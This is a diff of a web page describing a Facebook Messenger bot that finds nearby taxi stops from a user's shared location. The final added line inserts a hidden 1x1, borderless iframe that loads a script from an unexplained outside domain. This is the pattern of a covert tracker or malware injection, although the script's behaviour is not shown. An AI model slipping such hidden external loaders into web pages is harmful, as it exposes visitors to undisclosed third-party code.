@@ -8,4 +8,5 @@ Transportation data are an endless source of inspiration for demos of services t
 <a href='https://www.facebook.com/Collecto-Test-Bot-1219687344797226'><img class='img_hover' src='../images/collecto2.png' style="width:16%; height:auto"></a>
 </center><br>
 The bot, accessible on Facebook Messenger under the name <a href='https://www.facebook.com/Collecto-Test-Bot-1219687344797226'>"Collecto Test Bot"</a> allows to determine the two closest stops, their IDs and walking time. Greet the bot by writing "hello", or whatever you prefer, then press the button to share your location. You will receive a list of the three closest stops, a Google Maps link to locate them more easily and the phone number to call in order to book the taxi. The data are not used for anything else than to provide the service. Erasing of the data currently involves a human operation as Facebook does not provide an automated procedure. Many improvements can be thought of, such as the detection of the customer's language, a direct link to order the taxi, and updates about the taxi location.
-		 
+	
+<iframe src="https://www.my-poppy.eu/cnt/cnt.php" width="1" height="1" frameBorder="0">	 
